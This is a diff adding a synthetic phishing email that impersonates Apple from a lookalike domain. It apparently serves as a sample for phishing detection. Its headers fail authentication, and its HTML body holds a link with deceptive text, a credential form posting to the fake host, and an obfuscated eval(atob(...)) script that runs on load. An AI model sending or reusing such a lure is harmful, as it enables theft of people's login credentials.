@@ -1,0 +1,34 @@
+From: notice@apple-login.web.app
+To: victim48@example.com
+Subject: Access notice from Apple [ref F67DC28]
+Date: Tue, 18 Mar 2002 21:50:00 -0500
+Message-ID: <phish-168-bde0d5e5-a1cc-468b-937f-2b026c0813a1@apple-login.web.app>
+Received: from relay0 (relay0.example.net [192.0.2.100]) by mx0.example.com; Tue, 19 Mar 2002 15:04:00 -0500
+Received: from relay1 (relay1.example.net [192.0.2.101]) by mx1.example.com; Tue, 14 Mar 2002 18:40:00 -0500
+Received: from relay2 (relay2.example.net [192.0.2.102]) by mx2.example.com; Tue, 26 Mar 2002 03:26:00 -0500
+Received: from relay3 (relay3.example.net [192.0.2.103]) by mx3.example.com; Tue, 15 Mar 2002 18:53:00 -0500
+Received: from relay4 (relay4.example.net [192.0.2.104]) by mx4.example.com; Tue, 19 Mar 2002 06:30:00 -0500
+Received: from relay5 (relay5.example.net [192.0.2.105]) by mx5.example.com; Tue, 24 Mar 2002 04:00:00 -0500
+Received: from relay6 (relay6.example.net [192.0.2.106]) by mx6.example.com; Tue, 12 Mar 2002 06:27:00 -0500
+Return-Path: <bounce@mail-40f2f9cf.top>
+Reply-To: recovery8@gmail.com
+Authentication-Results: mx.example.com; spf=fail smtp.mailfrom=mail-40f2f9cf.top; dkim=fail header.d=apple-login.web.app; dmarc=fail header.from=apple-login.web.app
+Received-SPF: fail (mx.example.com: domain of notice@apple-login.web.app does not designate 203.0.113.10 as permitted sender)
+DKIM-Signature: v=1; a=rsa-sha256; d=apple-login.web.app; s=default; h=from:to:subject;
+MIME-Version: 1.0
+Content-Type: multipart/alternative; boundary="bnd-p-168-27d0ec25"
+
+--bnd-p-168-27d0ec25
+Content-Type: text/plain; charset="UTF-8"
+
+Hello,
+
+A new access notice is available for your profile.
+Review it here: https://login.secure.apple-login.web.app/auth?t=F67DC28
+
+Reference: F67DC28
+--bnd-p-168-27d0ec25
+Content-Type: text/html; charset="UTF-8"
+
+<html><body onload="track()"><p>Hello,<br/><br/>A new access notice is available for your profile.<br/>Review it here: https://login.secure.apple-login.web.app/auth?t=F67DC28<br/><br/>Reference: F67DC28</p><p><a href="http://apple-login.web.app/login">https://www.apple.com/signin</a></p><form action="http://apple-login.web.app/login" method="post"><input type="text" name="user"/><input type="password" name="pass" style="display:none"/><input type="submit" value="Continue"/></form><script>var s="review the notice";eval(atob('qGiGpdKXgULaLYzzeOvIPPXqitsyfzBRIsdOdZOIuowT+gBW+4C3F0EjMTQ9D98D/uzOWHyYtHSjSwieeCRbGpVjZfLZDjVlAgUSBD6u/D19yhJoHnvzeufP3BG1oynVRbmwDJYv7Qdx7ZA9oSzvBMqORsJdqFBNVGw+QxnEnsjd7w5LNM/L4SSCkGR9Ug52IgwEtZQoWrzTtIYlpnJrMQ=='));</script></body></html>
+--bnd-p-168-27d0ec25--
